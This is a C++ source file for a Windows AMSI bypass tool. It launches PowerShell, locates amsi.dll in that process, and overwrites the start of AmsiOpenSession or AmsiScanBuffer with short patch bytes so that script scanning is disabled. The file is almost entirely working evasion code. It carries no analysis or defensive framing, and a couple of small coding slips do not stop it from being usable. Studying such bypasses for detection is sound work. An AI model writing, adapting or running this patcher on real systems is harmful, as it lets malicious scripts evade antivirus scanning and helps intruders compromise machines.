#include "Patcher.h"

void Patcher::OpenSessionPatch()
{
	PROCESS_INFORMATION pi;
	if (!CreatePowershell(&pi))
		printf("[!] Cannot get process info\n");

	WaitForSingleObject(pi.hProcess, 500);

	HMODULE hAmsiDll = GetRemoteModuleHandle(pi.hProcess, L"amsi.dll");

	if (!hAmsiDll) {
		printf("[!] amsi handle is invalid\n");
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	printf("[+] Process Id %d\n", pi.dwProcessId);
	printf("[+] Amsi.dll remote addr (0x%p)\n", hAmsiDll);

	FARPROC funcAddr = GetRemoteProcAddress(hAmsiDll, "AmsiOpenSession");
	BYTE patch[] = { 0x48, 0x31, 0xC0 };
	
	printf("[+] Func addr %p\n", funcAddr);

	if (!WriteRemoteMemory(pi.hProcess, (LPVOID)funcAddr, patch, sizeof(patch))) {
		printf("[!] Cannot write memory to process...\n");
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}
	
	WaitForSingleObject(pi.hProcess, -1);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void Patcher::ScanBufferPatch()
{
	PROCESS_INFORMATION pi;
	if (!CreatePowershell(&pi))
		printf("[!] Cannot get process info\n");

	WaitForSingleObject(pi.hProcess, 500);

	HMODULE hAmsiDll = GetRemoteModuleHandle(pi.hProcess, L"amsi.dll");

	if (!hAmsiDll) {
		printf("[!] amsi handle is invalid\n");
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	printf("[+] Process Id %d\n", pi.dwProcessId);
	printf("[+] Amsi.dll remote addr (0x%p)\n", hAmsiDll);

	FARPROC funcAddr = GetRemoteProcAddress(hAmsiDll, "AmsiScanBuffer");
	BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

	printf("[+] Func addr %p\n", funcAddr);

	if (!WriteRemoteMemory(pi.hProcess, (LPVOID)funcAddr, patch, sizeof(patch))) {
		printf("[!] Cannot write memory to process...\n");
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	WaitForSingleObject(pi.hProcess, -1);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

BOOL Patcher::CreatePowershell(PROCESS_INFORMATION* ppi)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessA(NULL,
		(LPSTR)"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi)) {
		printf("[!] CreateProcess failed (%d).\n", GetLastError());
	}
	
	if (ppi != nullptr)
		*ppi = pi;

	return true;
}

BOOL Patcher::FuncPatcher(const BYTE* buf)
{
	return TRUE;
}

HMODULE Patcher::GetRemoteModuleHandle(const HANDLE& hProcess, LPCWSTR lpDllName)
{
	HMODULE hMods[1024];
	DWORD cbNeeded;
	unsigned int i;

	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
	{
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			TCHAR szModName[MAX_PATH];

			if (GetModuleBaseNameW(hProcess, hMods[i], szModName,
				sizeof(szModName) / sizeof(TCHAR)))
			{
				if (wcscmp(szModName, lpDllName) == 0) {
					return hMods[i];
				}
			}
		}
	}

	DWORD dwError = GetLastError();
	printf("[!] EnumProcessModules failed with error code %d\n", dwError);

	return NULL;
}

FARPROC Patcher::GetRemoteProcAddress(HMODULE hRemoteModule, LPCSTR lpProcName)
{
	HMODULE hLocalModule = LoadLibraryA("amsi.dll");
	if (!hLocalModule) {
		printf("[!] Cannot load library %d\n", GetLastError());
	}

	FARPROC lpLocalFunc = GetProcAddress(hLocalModule, lpProcName);
	if (!lpLocalFunc) {
		printf("[!] Cannot get local %s addr %d\n", lpProcName, GetLastError());
	}
	FARPROC lpRemoteFunc = (FARPROC)((LPBYTE)hRemoteModule + ((LPBYTE)lpLocalFunc - (LPBYTE)hLocalModule));
	FreeLibrary(hLocalModule);

	return lpRemoteFunc;
}

BOOL Patcher::WriteRemoteMemory(HANDLE hProcess, LPVOID addr, const BYTE* buf, size_t size)
{

	DWORD oldprotect = 0;
	if (!VirtualProtectEx(hProcess, addr, size, PAGE_EXECUTE_READWRITE, &oldprotect)) {
		printf("[!] NtProtectVirtualMemory failed with status: %d\n", GetLastError());
		return false;
	}

	DWORD writedData = 0;
	if(!WriteProcessMemory(hProcess, addr, buf, size, (PSIZE_T)writedData)){
		printf("[!] WriteProcessMemory failed with status: %d\n", GetLastError());
		return false;
	}

	if (!VirtualProtectEx(hProcess, addr, size, oldprotect, &oldprotect)) {
		printf("[!] NtProtectVirtualMemory restore failed with status: %d\n", GetLastError());
		return false;
	}

	return true;
}

